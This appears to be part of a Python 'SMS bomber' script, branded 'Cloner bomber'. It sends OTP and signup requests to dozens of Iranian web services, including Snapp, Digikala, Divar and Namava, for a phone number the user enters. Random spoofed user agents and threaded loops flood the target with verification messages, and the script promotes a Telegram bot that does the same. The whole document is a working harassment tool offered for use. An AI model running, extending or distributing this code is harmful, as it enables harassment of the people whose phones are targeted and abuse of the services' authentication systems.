...
letters =pyfiglet.figlet_format('Cloner bomber')
for char in letters:
        stdout.write(char)
        stdout.flush()
        sleep(0.0001/0.01)
class sms:
    def snap(phone):
        ...
        try:
            sn = post(url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD)
            return True
        except:
            pass
    ...
    def taghche(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            n = post("https://gw.taaghche.com/v4/site/auth/signup",json={"contact": "0"+phone.split("+98")[1]},headers=rhead, timeout=5)
            if "OK" in n:
                print(f'QCode Was Sent')
            return True
        except:
            pass
    ...
    def namava(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            s=post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": phone},headers=rhead ,timeout=5)
            if "OK" in s :
                print(f'QCode Was Sent')
            return True
        except:
    ...
    def ghabzino(phone):
        ...
        try:
            ghbz = get(url=ghU, headers=ghH, json=ghJ)
            if "OK" in ghbz:
                print(f'Code Was Sent')
            return True
        except:
            pass
    ...
    def abantether(phone):
        ...
        try:
            aban = post(url="https://abantether.com/users/register/phone/send/", data=n4, headers=rhead)
            if "OK" in aban:
                print(f'Code Was Sent')
            return True
        except:
    ...
    def donergarden(phone):
        ...
        rhead = {"user-agent": generate_user_agent()}
        try: #donergarden.com
            doner = post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            if "OK" in doner:
                print(f'Code Was Sent')
            return True
        except:
    ...
    def foodbell(phone):
        ...
        rhead = {"user-agent": generate_user_agent()}
        try: #foodbell.ir
            foodebele=post(url="https://restaurant.delino.com/user/register",json=js, headers=rhead)
            if "OK" in foodebele:
                print(f'Code Was Sent')
            return True
        except:
    ...
    def dastkhat(phone):
        ...
        rhead = {"user-agent": generate_user_agent()}
        try: 
            dast=post(url="https://dastkhat-isad.ir/api/v1/user/store",json=n4, headers=rhead)
            if "OK" in dast:
                print(f'Code Was Sent')
            return True
        except:
    ...
    def hamrahbours(phone):
        ...
        try: 
            bors = post(url="https://api.hbbs.ir/authentication/SendCode",json=n4, headers=rhead)
            if "OK" in bors:
                print(f'Code Was Sent')
            return True
        except:
    ...
    def ostadkr(phone):
        ...
        rhead = {'user-agent': generate_user_agent()}
        try: 
            ostad = post(url="https://api.ostadkr.com/login",json=n4, headers=rhead)
            if "OK" in ostad:
                print(f'Code Was Sent')
            return True
        except:
    ...
    def tajtehran(phone):
        n4 = f"mobile=0{phone.split('+98')[1]}&password=eliot9910"
...
'sec-ch-ua-mobile': '?1',
'user-agent': 'Mozilla/5.0 (Linux; Android 8; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
...
y='\033[1;33m'
w='\033[1;37m'
printLow(f'{w}Information:\n' )
printLow(f'{g}Made and edited by : {r}Cloner 💀\n{g}')
printLow(f'{g}Special Thanks to {r}xkdlee ❤️{g}\n')
printLow(f'{r}For more and better EXPERIENCE use @Elkbomberbot on Telegram\n')
import time
print("You Start Running Bomber at ",time.strftime("%H:%M:%S"))
from time import sleep

def vip(phone , xx = 11):
        printLow(f"{r}Running...\n")
        Thread(target=sms.a4baz, args=[phone]).start(),printLow(f"{g}A4baz {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.gharar, args=[phone]).start(),sleep(xx),printLow(f"{g}Ghrar {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.abantether, args=[phone]).start(),sleep(xx),printLow(f"{g}AbanTether {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.achar, args=[phone]).start(),sleep(xx),printLow(f"{g}Achar {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.alibaba, args=[phone]).start(),sleep(xx),printLow(f"{g}alibaba {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.alinance, args=[phone]).start(),sleep(xx),printLow(f"{g}alinance {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.alopeyk, args=[phone]).start(),sleep(xx),printLow(f"{g}alopeyk {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.alopeyk_safir, args=[phone]).start(),sleep(xx),printLow(f"{g}Safir {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.amoomilad, args=[phone]).start(),sleep(xx),printLow(f"{g}Amomilad {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.anar, args=[phone]).start(),sleep(xx),printLow(f"{g}anar {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.arka, args=[phone]).start(),sleep(xx),printLow(f"{g}arka {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.arshiyan, args=[phone]).start(),sleep(xx),printLow(f"{g}arshian {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.ashraafi, args=[phone]).start(),sleep(xx),printLow(f"{g}ashrafi {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.azki, args=[phone]).start(),sleep(xx),printLow(f"{g}azki {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.balad, args=[phone]).start(),sleep(xx),printLow(f"{g}balad {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.bama, args=[phone]).start(),sleep(xx),printLow(f"{g}bama {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.banankala, args=[phone]).start(),sleep(xx),printLow(f"{g}banankala {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.bandarazad, args=[phone]).start(),sleep(xx),printLow(f"{g}Bandarazad {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.banimode, args=[phone]).start(),sleep(xx),printLow(f"{g}Banimode {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.basalam, args=[phone]).start(),sleep(xx),printLow(f"{g}AbanTether {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.baskol, args=[phone]).start(),sleep(xx),printLow(f"{g}baskol {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.bazidone, args=[phone]).start(),sleep(xx),printLow(f"{g}bazidone {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.beheshticarpet, args=[phone]).start(),sleep(xx),printLow(f"{g}beheshticarpet {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.bigtoys, args=[phone]).start(),sleep(xx),printLow(f"{g}bigtoys {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.bimito, args=[phone]).start(),sleep(xx),printLow(f"{g}bimito {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.binjo, args=[phone]).start(),sleep(xx),printLow(f"{g}binjo {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.bit24, args=[phone]).start(),sleep(xx),printLow(f"{g} bit24 {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.bitex24, args=[phone]).start(),sleep(xx),printLow(f"{g} bitex24 {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.candoosms, args=[phone]).start(),sleep(xx),printLow(f"{g} cando {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.chamedoon, args=[phone]).start(),sleep(xx),printLow(f"{g} cahmedoon {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.chaymarket, args=[phone]).start(),sleep(xx),printLow(f"{g} chaymaket {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.cinematicket, args=[phone]).start(),sleep(xx),printLow(f"{g} cinema {r} Sent ! \n "),sleep(xx)
        Thread(target=sms.coffefastfoodluxury, args=[phone]).start(),sleep(xx),printLow(f"{g} coffe {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.dadhesab, args=[phone]).start(),sleep(xx),printLow(f"{g} hesab {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.dadpardaz, args=[phone]).start(),sleep(xx),printLow(f"{g} pardaz {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.dastkhat, args=[phone]).start(),sleep(xx),printLow(f"{g} dastkhat {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.delino, args=[phone]).start(),sleep(xx),printLow(f"{g} delino {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.devslop, args=[phone]).start(),sleep(xx),printLow(f"{g} devslop {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.deyfriedchicken, args=[phone]).start(),sleep(xx),printLow(f"{g} chicken {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.dicardo, args=[phone]).start(),sleep(xx),printLow(f"{g} dicardo {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.didnegar, args=[phone]).start(),sleep(xx),printLow(f"{g} didngar {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.digikala, args=[phone]).start(),sleep(xx),printLow(f"{g} digikala {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.digikalajet, args=[phone]).start(),sleep(xx),printLow(f"{g} djet {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.digipay, args=[phone]).start(),sleep(xx),printLow(f"{g} digpay {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.digistyle, args=[phone]).start(),sleep(xx),printLow(f"{g} digstyle {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.divar, args=[phone]).start(),sleep(xx),printLow(f"{g} divar {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.doctor, args=[phone]).start(),sleep(xx),printLow(f"{g} doctor {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.doctoreto, args=[phone]).start(),sleep(xx),printLow(f"{g} docto {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.donergarden, args=[phone]).start(),sleep(xx),printLow(f"{g} Garden {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.dosma, args=[phone]).start(),sleep(xx),printLow(f"{g} dosma {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.drdr, args=[phone]).start(),sleep(xx),printLow(f"{g} drdr {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.drsaina, args=[phone]).start(),sleep(xx),printLow(f"{g} saina {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.ehteraman, args=[phone]).start(),sleep(xx),printLow(f"{g} ehteram {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.emtiaz, args=[phone]).start(),sleep(xx),printLow(f"{g} emtiaz {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.exo, args=[phone]).start(),sleep(xx),printLow(f"{g} exo {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.express, args=[phone]).start(),sleep(xx),printLow(f"{g} express {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.farsgraphic, args=[phone]).start(),sleep(xx),printLow(f"{g} farsghrapic {r} Sent ! \n")
        Thread(target=sms.filmnet, args=[phone]).start(),sleep(xx),printLow(f"{g} filmnet {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.flightio, args=[phone]).start(),sleep(xx),printLow(f"{g} flighto {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.foodbell, args=[phone]).start(),sleep(xx),printLow(f"{g} football {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.foodcenter, args=[phone]).start(),sleep(xx),printLow(f"{g} foodcenter {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.foodiran16, args=[phone]).start(),sleep(xx),printLow(f"{g} foodiran16 {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.foodlandkish, args=[phone]).start(),sleep(xx),printLow(f"{g} landkish {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.gap, args=[phone]).start(),sleep(xx),printLow(f"{g} gap {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.gapfilm, args=[phone]).start(),sleep(xx),printLow(f"{g} gapfilm {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.garcon, args=[phone]).start(),sleep(xx),printLow(f"{g} garcon {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.gelatohouse, args=[phone]).start(),sleep(xx),printLow(f"{g} ghouse {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.ghabzino, args=[phone]).start(),sleep(xx),printLow(f"{g} ghbzino {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.ghasedak24, args=[phone]).start(),sleep(xx),printLow(f"{g} ghasedak {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.givernfood, args=[phone]).start(),sleep(xx),printLow(f"{g} gfood {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.glite, args=[phone]).start(),sleep(xx),printLow(f"{g} glite {r} Sent ! \n"),sleep(xx)
        Thread(target=sms.hamrahbours, args=[phone]).start(),sleep(xx),printLow(f"{g} hamrahbours {r} Sent ! \n"),sleep(xx)


while True:
    phone = is_phone(input(f'☎️{g}Enter Number Whitout 0{g} {r} : {g}'))
    if phone:
        break
try:
    xx = float(input(f'🤖️  {g}sleep time  {g}[normal=0.1] {r}>>>> {g}'))
except ValueError:
    xx = 0.1
